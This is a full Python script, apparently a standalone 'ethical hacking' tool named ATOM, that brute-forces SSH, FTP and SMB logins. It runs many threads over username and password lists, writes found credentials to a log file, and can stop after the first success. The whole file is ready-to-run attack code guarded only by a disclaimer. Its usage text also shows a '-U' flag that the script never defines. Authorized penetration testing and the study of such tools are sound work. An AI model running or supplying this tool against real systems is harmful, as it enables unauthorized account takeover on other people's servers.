#!/usr/bin/env python3
"""
ATOM - Ethical Hacking Brute Force Tool
---------------------------------------
A multi-threaded, modular brute-force tool designed for authorized
security auditing. It supports SSH, FTP, and SMB protocols.

Usage:
    python atom.py -H 192.168.1.10 -u admin -P passwords.txt -M ssh
    python atom.py -H hosts.txt -U users.txt -P passwords.txt -M ftp -t 10

Ethical Notice:
    This tool is for educational use and authorized penetration testing only.
    Use of this tool against systems you do not own or have explicit permission
    to test is illegal and violates this tool's terms of use.
"""

import argparse
import concurrent.futures
import ftplib
import socket
import sys
import time
import threading
import os
from datetime import datetime

# --- Dependency Checks ---
# We wrap imports to allow the tool to run (with limited features) 
# even if libraries are missing.

MODULES_AVAILABLE = {
    "ssh": False,
    "ftp": True,  # Built-in
    "smb": False
}

try:
    import paramiko
    MODULES_AVAILABLE["ssh"] = True
    logging_null = paramiko.util.logging.getLogger()
    logging_null.setLevel(paramiko.util.logging.WARN) 
except ImportError:
    pass

try:
    from smb.SMBConnection import SMBConnection
    MODULES_AVAILABLE["smb"] = True
except ImportError:
    pass

# --- Configuration & Colors ---

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# Thread safety for printing
print_lock = threading.Lock()
stop_event = threading.Event()

def log(message, level="INFO", verbose=False):
    """Thread-safe logging function."""
    if level == "DEBUG" and not verbose:
        return

    timestamp = datetime.now().strftime("%H:%M:%S")
    
    with print_lock:
        if level == "SUCCESS":
            print(f"{Colors.GREEN}[+] [{timestamp}] {message}{Colors.ENDC}")
        elif level == "FAIL":
            if verbose:
                print(f"{Colors.RED}[-] [{timestamp}] {message}{Colors.ENDC}")
        elif level == "INFO":
            print(f"{Colors.BLUE}[*] [{timestamp}] {message}{Colors.ENDC}")
        elif level == "WARNING":
            print(f"{Colors.YELLOW}[!] [{timestamp}] {message}{Colors.ENDC}")
        elif level == "ERROR":
            print(f"{Colors.RED}[ERROR] {message}{Colors.ENDC}")

# --- Input Helpers ---

def load_target_data(arg_value):
    """
    Determines if the argument is a file path or a single string.
    Returns a list of strings.
    """
    if not arg_value:
        return []
    
    if os.path.isfile(arg_value):
        with open(arg_value, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    else:
        return [arg_value]

# --- Protocol Modules ---

def attack_ssh(host, port, user, password, timeout):
    """SSH Brute Force Module using Paramiko"""
    if not MODULES_AVAILABLE["ssh"]:
        return False, "Module missing (paramiko)"
        
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(host, port=port, username=user, password=password, timeout=timeout, banner_timeout=timeout)
        ssh.close()
        return True, "Login Successful"
    except paramiko.AuthenticationException:
        return False, "Auth Failed"
    except paramiko.SSHException as e:
        # Often occurs if the server enforces a delay or lockout
        time.sleep(2) 
        return False, f"SSH Exception: {str(e)}"
    except socket.error:
        return False, "Connection Error"
    except Exception as e:
        return False, str(e)
    finally:
        ssh.close()

def attack_ftp(host, port, user, password, timeout):
    """FTP Brute Force Module using ftplib"""
    ftp = ftplib.FTP()
    try:
        ftp.connect(host, port, timeout=timeout)
        ftp.login(user, password)
        ftp.quit()
        return True, "Login Successful"
    except ftplib.error_perm:
        return False, "Auth Failed"
    except Exception as e:
        return False, str(e)

def attack_smb(host, port, user, password, timeout):
    """SMB Brute Force Module using pysmb"""
    if not MODULES_AVAILABLE["smb"]:
        return False, "Module missing (pysmb)"
    
    try:
        # Client name, Server name, Remote IP, user, pass, domain
        # We use host as remote_name, usually works for IP-based auth
        conn = SMBConnection(user, password, "AtomClient", host, use_ntlm_v2=True)
        success = conn.connect(host, port, timeout=timeout)
        
        if success:
            conn.close()
            return True, "Login Successful"
        else:
            return False, "Connection refused or auth failed"
    except Exception as e:
        return False, str(e)

# --- Core Logic ---

def attempt_login(host, port, user, password, module, verbose, stop_on_success):
    """
    Worker function executed by threads.
    """
    # Check if we should stop globally
    if stop_event.is_set():
        return

    result = False
    msg = ""

    if module == 'ssh':
        result, msg = attack_ssh(host, port, user, password, 5)
    elif module == 'ftp':
        result, msg = attack_ftp(host, port, user, password, 5)
    elif module == 'smb':
        result, msg = attack_smb(host, port, user, password, 5)

    if result:
        log(f"SUCCESS: {host}:{port} - {user}:{password}", "SUCCESS")
        
        # Log to file if needed
        with open("atom_success.log", "a") as f:
            f.write(f"[{module.upper()}] {host}:{port} | User: {user} | Pass: {password}\n")
            
        if stop_on_success:
            stop_event.set()
    else:
        log(f"FAILED: {host} - {user}:{password} ({msg})", "FAIL", verbose)

def main():
    parser = argparse.ArgumentParser(description="ATOM: Multi-threaded Brute Force Tool")
    
    # Target definition
    target_group = parser.add_argument_group('Target')
    target_group.add_argument('-H', '--host', required=True, help='Target IP/Hostname or file containing hosts')
    target_group.add_argument('-p', '--port', type=int, help='Custom port (optional, defaults to protocol standard)')
    
    # Credentials
    cred_group = parser.add_argument_group('Credentials')
    cred_group.add_argument('-u', '--user', help='Single username or file containing usernames')
    cred_group.add_argument('-P', '--password', help='Single password or file containing passwords')
    
    # Configuration
    config_group = parser.add_argument_group('Configuration')
    config_group.add_argument('-M', '--module', required=True, choices=['ssh', 'ftp', 'smb'], help='Protocol to attack')
    config_group.add_argument('-t', '--threads', type=int, default=4, help='Number of concurrent threads (default: 4)')
    config_group.add_argument('-f', '--stop-on-success', action='store_true', help='Stop attack immediately after finding credentials')
    config_group.add_argument('-v', '--verbose', action='store_true', help='Show failed attempts')

    args = parser.parse_args()

    # Banner
    print(f"{Colors.HEADER}")
    print(r"""
       _  _____  ____  __  __ 
      / \|_   _|/ __ \|  \/  |
     / _ \ | | | |  | | |\/| |
    / ___ \| | | |__| | |  | |
   /_/   \_\_|  \____/|_|  |_|
    """)
    print(f"   E T H I C A L   B R U T E   F O R C E R{Colors.ENDC}")
    print("-" * 50)

    # 1. Load Data
    hosts = load_target_data(args.host)
    users = load_target_data(args.user)
    passwords = load_target_data(args.password)

    if not hosts:
        log("No hosts provided.", "ERROR")
        sys.exit(1)
    if not users or not passwords:
        log("No usernames or passwords provided.", "ERROR")
        sys.exit(1)

    # 2. Determine Port
    port = args.port
    if not port:
        if args.module == 'ssh': port = 22
        elif args.module == 'ftp': port = 21
        elif args.module == 'smb': port = 445

    # 3. Check Module Availability
    if not MODULES_AVAILABLE[args.module]:
        log(f"The required library for {args.module} is not installed.", "ERROR")
        if args.module == 'ssh':
            log("Please run: pip install paramiko", "INFO")
        elif args.module == 'smb':
            log("Please run: pip install pysmb", "INFO")
        sys.exit(1)

    log(f"Targeting {len(hosts)} host(s) with {len(users)} user(s) and {len(passwords)} password(s).", "INFO")
    log(f"Module: {args.module.upper()} | Port: {port} | Threads: {args.threads}", "INFO")
    log("Starting Attack...", "INFO")

    # 4. Start Thread Pool
    # We create a list of all tasks first. 
    # Note: For massive wordlists, this should be a generator, but for lists < 100k lines, this is fine.
    
    total_tasks = len(hosts) * len(users) * len(passwords)
    task_count = 0
    
    start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        
        for h in hosts:
            for u in users:
                for p in passwords:
                    if stop_event.is_set():
                        break
                    futures.append(executor.submit(attempt_login, h, port, u, p, args.module, args.verbose, args.stop_on_success))
        
        # Wait for completion
        try:
            concurrent.futures.wait(futures)
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n{Colors.YELLOW}[!] Stopping threads... (Ctrl+C detected){Colors.ENDC}")
            executor.shutdown(wait=False)

    duration = time.time() - start_time
    print("-" * 50)
    log(f"Scan completed in {duration:.2f} seconds.", "INFO")
    if stop_event.is_set():
        log("Credentials found. Check atom_success.log", "SUCCESS")
    else:
        log("No valid credentials found.", "INFO")

if __name__ == "__main__":
    main()